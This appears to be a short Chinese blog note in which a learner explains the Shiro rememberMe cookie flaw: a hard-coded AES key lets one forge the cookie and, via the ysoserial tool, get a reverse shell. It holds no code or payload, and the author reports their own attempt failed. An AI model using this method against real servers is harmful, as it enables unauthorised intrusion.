+<p><img src="https://raw.githubusercontent.com/tea9/image/master/blog_img/57/26.png"></p>
 <p>我理解的原理</p>
 <p>他本质的原因是cookie有个rememberMe的参数，他出现了个问题什么问题呢，他本身的作用就是为了记住密码的，然后下一次打开浏览器就会直接读取rememberMe的值，这是他本身的逻辑，然后缺陷在与他本身的密码是硬编码的，然后他的算法也是可以被拆解的，我们通过他原本的算法（序列化+使用密钥aes+base64）加上硬编码的密钥就可以得到这个rememberMe的值了，然后通过脚本加反序列化利用工具yso就可以成功的反弹shell了。</p>
 <p>然后还不明确的点是反序列化，和yso反序列化工具的作用把。可能后面理解了再来补充，然后自己生成的rememberme的值没有执行成功，还不懂怎么发送cookie，等学会了在来试试把。</p>
